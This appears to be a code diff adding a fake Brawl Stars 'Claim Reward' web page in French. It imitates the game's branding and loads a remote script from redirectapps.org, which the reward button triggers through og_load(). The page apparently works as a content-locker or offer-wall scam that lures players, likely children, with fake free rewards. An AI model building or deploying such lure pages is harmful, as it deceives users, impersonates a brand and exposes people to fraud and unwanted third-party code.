@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Brawl Stars - Récompense</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script type="text/javascript" id="ogjs" src="https://redirectapps.org/cl/js/6ndgxv"></script>
+    <style>
+        @font-face {
+            font-family: 'Nougat';
+            src: url('./public/fonts/fonnts.com-kurstiva_black.otf') format('truetype');
+            font-weight: 900;
+            font-style: normal;
+        }
+        
+         body {
+            background: url('./public/background1.jpg') center center / cover repeat;
+            background-attachment: fixed;
+            min-height: 100vh;
+            font-family: 'Nougat', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+        }
+        
+        .btn-primary {
+            background: linear-gradient(180deg, #FFD93D 0%, #FFB800 100%);
+            box-shadow: 0 4px 0 #C98E00, 0 6px 15px rgba(0,0,0,0.2);
+            transition: transform 0.1s, box-shadow 0.1s;
+        }
+        
+        .btn-primary:active {
+            transform: translateY(3px);
+            box-shadow: 0 1px 0 #C98E00, 0 3px 10px rgba(0,0,0,0.2);
+        }
+        
+        .store-img:hover {
+            opacity: 0.9;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Main Content -->
+    <div class="flex flex-col items-center  min-h-screen mt-20  ">
+        
+        <!-- Logo -->
+        <div class="mb-5">
+            <img src="./public/brawlstars.png" alt="Brawl Stars" class="w-[200px] h-auto object-contain">
+        </div>
+
+        <!-- Heading -->
+        <h1 class="text-[#FFB800] text-[20px] md:text-3xl font-bold text-center mb-5 leading-tight uppercase" style="text-shadow: 2px 2px 8px rgba(0,0,0,0.3); ">
+            Claim a Reward in Brawl Stars <span class="font-mono">!</span>
+        </h1>
+
+        <!-- CTA Button -->
+        <button onclick="og_load();" class="btn-primary text-gray-900 text-xl font-black px-10 py-4 rounded-2xl mb-5 w-[80%] max-w-sm border-4 border-black uppercase tracking-wide">
+            Claim Reward
+        </button>
+
+        <!-- Download Section -->
+        <h2 class="text-[#FFB800] text-2xl font-semibold uppercase   ">
+            Download Brawl Stars
+        </h2>
+
+        <!-- Store Buttons -->
+        <div class="w-full max-w-sm flex justify-center">
+            <a href="#" class="block transition-opacity store-img w-4/5">
+                <img src="./public/play-app.png" alt="Download on Google Play and App Store" class="w-full h-auto ">
+            </a>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="bg-black text-white py-8 px-6 font-sans">
+        <nav class="max-w-4xl mx-auto flex justify-center gap-8 text-xs md:text-sm">
+            <a href="#" class="hover:text-gray-400 transition-colors text-center">
+                Guide<br>parental
+            </a>
+            <a href="#" class="hover:text-gray-400 transition-colors text-center">
+                Conditions<br>d'utilisation
+            </a>
+            <a href="#" class="hover:text-gray-400 transition-colors text-center">
+                Politique de<br>confidentialité
+            </a>
+        </nav>
+    </footer>
+</body>
+</html>
